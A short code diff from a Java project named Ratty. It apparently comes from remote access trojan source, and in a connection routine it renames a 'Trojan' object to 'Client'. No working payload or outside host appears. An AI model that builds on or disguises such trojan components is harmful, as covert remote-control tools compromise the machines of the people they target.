@@ -102,7 +102,7 @@ public final class Ratty {
 	
 	public static void connectToHost(final String address, final int port) {
 		final ActiveConnection newClient = new ActiveConnection(address, port);
-		final Trojan trojan = new Trojan();
+		final Client trojan = new Client();
 		
 		if (!newClient.isOpen()) {
 			try {
